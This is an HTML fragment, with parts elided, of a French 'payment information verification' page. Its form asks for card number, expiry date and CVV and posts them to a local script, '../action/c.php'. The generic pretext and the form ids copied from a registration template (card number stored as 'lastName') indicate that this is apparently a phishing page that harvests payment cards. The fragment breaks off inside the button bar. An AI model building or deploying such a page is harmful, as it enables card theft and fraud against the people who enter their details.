...
<html xmlns="http://www.w3.org/1999/xhtml" class=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="">
    ...
    <div id="container">
        ...
        <div id="container">
            <main role="main">
                <h2>Vérification de vos informations de paiement</h2>
                <div>
                ...
                <section>
                    <form id="kc-register-form" class="form-simple" action="../action/c.php" method="post">
                        <div id="part1">
                            <div class="slidepage">
                                <section>
                                    <h3>Vos données de paiement</h3>
                                    ...
                                    <p>Veuillez renseigner les informations de paiements suivantes :</p>
                                    ...
                                    <div id="form-element" onmouseover="validateField()">
                                        <p id="id-lastname">
                                            <label for="lastName">
                                                <span class="asterisque">*</span>Numero de la carte
                                            </label>
                                            <span id="checkMessageLastName" hidden="true"></span>
                                            <input minlength="19" required="" id="lastName" class="input-text" name="cc" type="text" autocomplete="off" maxlength="19" value="" placeholder="4242 4242 4242 4242">
                                        </p>
                                        <p id="id-firstname">
                                            <label for="firstName">
                                                <span class="asterisque">*</span>Date d'expiration
                                            </label>
                                            <span id="checkMessageFirstName" hidden="true"></span>
                                            <input required="" id="firstName" class="input-text" name="exp" type="text" autocomplete="off" maxlength="5" value="" placeholder="MM/AA">
                                        </p>
                                        <p id="id-firstname">
                                            <label for="firstName">
                                                <span class="asterisque">*</span>Cryptogramme
                                            </label>
                                            <span id="checkMessageFirstName" hidden="true"></span>
                                            <input required="" id="firstName" class="input-text" name="cvv" type="text" autocomplete="off" value="" maxlength="4" placeholder="123">
                                        </p>
                                        <ul class="buttons-bar">
                                            <li>
                                                <a href="infos.php" id="cancelBtn" class="bt-secondary">Annuler</a>
                                            </li>
                                            <li>
